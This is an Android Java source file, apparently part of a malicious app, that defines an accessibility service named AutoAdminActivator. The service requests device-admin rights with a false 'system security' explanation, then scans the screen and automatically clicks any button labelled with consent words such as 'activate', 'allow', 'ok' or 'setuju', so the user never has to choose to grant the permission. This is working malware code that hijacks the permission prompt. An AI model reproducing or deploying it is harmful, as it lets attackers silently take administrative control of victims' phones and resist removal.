package com.nullx.pp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AutoAdminActivator extends AccessibilityService {

    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean isProcessing = false;
    private boolean adminActivated = false; // Tambahan untuk cache status admin

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                        | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                        | AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                   | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 50;
        setServiceInfo(info);

        // Saat accessibility aktif, langsung request device admin
        handler.postDelayed(() -> {
            if (!isAdminActive()) {
                requestAdmin();
            } else {
                adminActivated = true;
            }
        }, 800);
    }

    private boolean isAdminActive() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm == null) return false;
            ComponentName admin = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
            boolean isActive = dpm.isAdminActive(admin); // ✅ Ini boolean, bukan int
            if (isActive) {
                adminActivated = true;
            }
            return isActive;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private void requestAdmin() {
        try {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            ComponentName admin = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan sistem.");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // ✅ Gunakan adminActivated sebagai boolean, bukan isAdminActive()
        if (adminActivated || isProcessing) return;

        handler.postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                isProcessing = true;
                tryClickActivate(root);
                root.recycle();
                // Cek lagi apakah admin sudah aktif
                if (isAdminActive()) {
                    adminActivated = true;
                }
                handler.postDelayed(() -> isProcessing = false, 500);
            } catch (Exception e) {
                e.printStackTrace();
                isProcessing = false;
            }
        }, 100);
    }

    private void tryClickActivate(AccessibilityNodeInfo node) {
        if (node == null) return;

        // Kumpulkan semua teks
        StringBuilder textBuilder = new StringBuilder();
        if (node.getText() != null) {
            textBuilder.append(node.getText().toString().toLowerCase());
        }
        if (node.getContentDescription() != null) {
            textBuilder.append(node.getContentDescription().toString().toLowerCase());
        }
        String text = textBuilder.toString();

        // Kata kunci di berbagai bahasa dan ROM
        boolean isActivateBtn = node.isClickable() && (
            text.contains("activate")    || text.contains("aktifkan")  ||
            text.contains("allow")       || text.contains("izinkan")   ||
            text.contains("enable")      || text.contains("aktif")     ||
            text.contains("ok")          || text.contains("accept")    ||
            text.contains("confirm")     || text.contains("setuju")    ||
            text.contains("install")     || text.contains("grant")     ||
            text.contains("continue")    || text.contains("lanjut")    ||
            text.contains("agree")       || text.contains("ya")        ||
            text.contains("yes")
        );

        if (isActivateBtn) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }

        // Rekursif ke child nodes
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                tryClickActivate(child);
                child.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {
        isProcessing = false;
    }
}